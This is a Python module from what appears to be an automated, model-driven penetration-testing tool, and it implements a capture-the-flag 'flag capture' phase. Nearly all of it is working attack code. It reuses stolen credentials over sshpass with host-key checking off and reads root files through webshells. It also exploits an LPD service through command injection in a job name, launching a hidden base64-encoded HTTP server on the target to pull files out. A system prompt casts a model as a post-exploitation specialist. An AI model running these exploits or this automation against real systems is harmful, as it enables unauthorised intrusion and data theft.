import asyncio
import base64
import json
import logging
import re
import shlex
import socket
import time
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.kali_tools_client import kali
from orchestrator.providers import call_model

logger = logging.getLogger("phase_flag_capture")

FLAG_PATTERN = re.compile(r'HTB\{[^}]+\}|flag\{[^}]+\}|[a-f0-9]{32}')
FLAG_FILES = [
    "/root/root.txt",
    "/root/flag.txt",
    "/root/flag",
    "/home/*/user.txt",
    "/home/*/flag.txt",
    "/home/*/flag",
    "/tmp/flag.txt",
    "/opt/flag.txt",
    "/var/flag.txt",
    "/flag.txt",
    "/flag",
]

EXTRACT_SYSTEM_PROMPT = """You are a post-exploitation flag extraction specialist.
Given the current state of findings from previous phases, determine if we have enough
access to read flag files. If we have credentials, suggest how to use them.

Output ONLY valid JSON:
{"reasoning": "analysis", "tool": "tool_name", "args": "arguments", "explanation": "what this does"}

Available approaches:
1. Direct file read via bash: cat /root/root.txt
2. SSH with known creds: sshpass -p 'password' ssh user@host cat /root/root.txt
3. Via webshell: curl http://target/shell.php?cmd=cat%20/root/root.txt
4. Via su: echo 'password' | sudo -S cat /root/root.txt
5. Via python: python3 -c "import os; print(os.popen('cat /root/root.txt').read())"
"""


async def run_flag_capture(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    flag_findings = list(findings or [])
    errors = []

    existing_creds = []
    for f in flag_findings:
        if f.type == "credential" and f.payload:
            try:
                existing_creds.append(json.loads(f.payload))
            except (json.JSONDecodeError, TypeError):
                pass
        if f.type == "credential" and f.evidence and ":" in f.evidence:
            parts = f.evidence.split(":", 1)
            existing_creds.append({"user": parts[0].strip(), "password": parts[1].strip()})

    web_shell_paths = []
    for f in flag_findings:
        if f.type == "webshell_deployed":
            web_shell_paths.append(f.evidence)
        if f.type == "rce" and f.payload:
            try:
                payload = json.loads(f.payload) if isinstance(f.payload, str) else f.payload
                ws = payload.get("webshell")
                if ws:
                    web_shell_paths.append(ws)
            except (json.JSONDecodeError, TypeError, AttributeError):
                pass
        if "shell.php" in (f.evidence or ""):
            web_shell_paths.append(f.evidence)

    for f in flag_findings:
        if f.type in ("user_flag", "root_flag"):
            return PhaseResult(
                phase="flag_capture",
                success=True,
                findings=flag_findings,
                summary="Flags already captured in previous phases",
                latency=time.time() - t0,
            )

    for shell_url in set(web_shell_paths):
        for flag_file in ["/root/root.txt", "/home/*/user.txt", "/flag.txt"]:
            try:
                cmd = f"cat {flag_file}"
                result = await kali.run("curl", f"-s --max-time 5 {json.dumps(shell_url)}?cmd={cmd.replace(' ', '%20')}", timeout=10)
                stdout = result.get("stdout", "")
                if stdout.strip() and "couldn't connect" not in stdout.lower() and "not found" not in stdout.lower():
                    flags = FLAG_PATTERN.findall(stdout)
                    for flag in flags:
                        ftype = "root_flag" if "root" in flag_file else "user_flag"
                        flag_findings.append(Finding(
                            phase="flag_capture", type=ftype, target=target,
                            severity=Severity.CRITICAL,
                            description=f"FLAG via webshell ({flag_file}): {flag}",
                            evidence=stdout[:500],
                        ))
            except Exception as e:
                logger.debug(f"Webshell read {flag_file} failed: {e}")

    for cred in existing_creds[:5]:
        user = cred.get("user", "")
        password = cred.get("password", "")
        if not user or not password:
            continue
        for flag_file in ["/root/root.txt", f"/home/{user}/user.txt", "/flag.txt"]:
            try:
                cmd = f"cat {flag_file} 2>/dev/null"
                result = await kali.run(
                    "sshpass",
                    f"-p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} {shlex.quote(cmd)}",
                    timeout=15
                )
                stdout = result.get("stdout", "")
                if stdout.strip() and "Permission denied" not in stdout and "try again" not in stdout.lower():
                    flags = FLAG_PATTERN.findall(stdout)
                    for flag in flags:
                        ftype = "root_flag" if "root" in flag_file else "user_flag"
                        flag_findings.append(Finding(
                            phase="flag_capture", type=ftype, target=target,
                            severity=Severity.CRITICAL,
                            description=f"FLAG via SSH ({user}): {flag}",
                            evidence=stdout[:500],
                        ))
            except Exception as e:
                logger.debug(f"SSH read {flag_file} as {user} failed: {e}")

    for cred in existing_creds[:5]:
        user = cred.get("user", "")
        password = cred.get("password", cred.get("pass", ""))
        if not user or not password:
            continue
        for cmd in [
            f"find / -name user.txt -o -name root.txt -o -name flag.txt 2>/dev/null",
            f"cat /root/root.txt 2>/dev/null; cat /home/*/user.txt 2>/dev/null",
        ]:
            try:
                result = await kali.run(
                    "sshpass",
                    f"-p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} {shlex.quote(cmd)}",
                    timeout=15
                )
                stdout = result.get("stdout", "").strip()
                if stdout and "Permission denied" not in stdout:
                    flags = FLAG_PATTERN.findall(stdout)
                    for flag in flags:
                        ftype = "root_flag"
                        flag_findings.append(Finding(
                            phase="flag_capture", type=ftype, target=target,
                            severity=Severity.CRITICAL,
                            description=f"FLAG via SSH ({user}): {flag}",
                            evidence=stdout[:500],
                        ))
            except Exception as e:
                logger.debug(f"SSH cmd on {target} as {user} failed: {e}")

    # ── LPD RCE flag capture via HTTP server output channel ──
    has_lpd = any(f.port == 1515 for f in flag_findings)
    if has_lpd and not any(f.type in ("user_flag", "root_flag") for f in flag_findings):
        logger.info("  [FlagCapture] Deploying HTTP server via LPD for flag capture...")
        try:
            http_port = 8889
            fork_script = base64.b64encode(
                ("import os,sys\n"
                 "if os.fork(): sys.exit(0)\n"
                 "os.setsid()\n"
                 "os.chdir('/tmp')\n"
                 "os.system('python3 -m http.server {} >/dev/null 2>&1')\n").format(http_port).encode()
            ).decode()

            def _lpd_send(cmd):
                try:
                    s2 = socket.socket()
                    s2.settimeout(10)
                    s2.connect((target, 1515))
                    s2.send(b'\x02archive_intake')
                    time.sleep(0.3)
                    s2.recv(1024)
                    jn = f"';{cmd};#'"
                    ct = f"J{jn}\n".encode()
                    s2.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
                    time.sleep(0.5)
                    try: s2.recv(4096)
                    except Exception:
                        pass
                    s2.close()
                except Exception:
                    pass

            # Deploy HTTP server
            _lpd_send(f"echo {fork_script} | base64 -d | python3")
            time.sleep(2)

            # Read all flag paths and write to /tmp
            flag_read_cmds = [
                "cat /home/*/user.txt 2>/dev/null > /tmp/_fu.txt; "
                "cat /root/root.txt 2>/dev/null > /tmp/_fr.txt; "
                "for f in /home/*/user.txt /root/root.txt /flag.txt /opt/flag.txt; "
                "do cat \"$f\" 2>/dev/null >> /tmp/_fa.txt; done",
            ]
            for cmd in flag_read_cmds:
                _lpd_send(cmd)
                time.sleep(0.5)

            # Read flags back via HTTP
            import urllib.request
            for fname, ftype in [("_fu.txt","user_flag"), ("_fr.txt","root_flag"),
                                  ("_fp.txt","flag_paths"), ("_fa.txt","all_flags")]:
                url = f"http://{target}:{http_port}/{fname}"
                try:
                    resp = urllib.request.urlopen(url, timeout=5)
                    body = resp.read().decode(errors="replace").strip()
                    if body:
                        logger.info(f"  [FlagCapture] HTTP output ({fname}): {body[:200]}")
                        flags = FLAG_PATTERN.findall(body)
                        for flag in flags:
                            flag_findings.append(Finding(
                                phase="flag_capture", type=ftype, target=target,
                                severity=Severity.CRITICAL,
                                description=f"FLAG via LPD HTTP: {flag}",
                                evidence=body[:500],
                            ))
                except Exception:
                    pass

        except Exception as e:
            logger.debug(f"LPD HTTP flag capture failed: {e}")

    latency = time.time() - t0
    new_flags = [f for f in flag_findings if f.phase == "flag_capture"]
    user_flags = [f for f in new_flags if f.type == "user_flag"]
    root_flags = [f for f in new_flags if f.type == "root_flag"]

    return PhaseResult(
        phase="flag_capture",
        success=len(new_flags) > 0,
        findings=flag_findings,
        summary=(
            f"Flag capture: {len(new_flags)} findings"
            + (f", user flag: {user_flags[0].evidence[:40]}" if user_flags else "")
            + (f", root flag: {root_flags[0].evidence[:40]}" if root_flags else "")
            + (" no flags found" if not new_flags else "")
        ),
        latency=latency,
        error="; ".join(errors) if errors else None,
    )
